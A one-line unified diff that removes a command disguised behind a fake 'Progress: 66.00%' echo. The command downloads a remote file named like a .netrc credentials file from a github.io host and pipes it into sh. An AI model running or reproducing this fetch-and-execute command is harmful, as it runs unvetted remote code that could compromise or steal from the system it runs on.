@@ -1,1 +1,0 @@
-echo Progress: 66.00%curl -L --progress-bar frkns.github.io/fun/creditMatched.netrc | sh
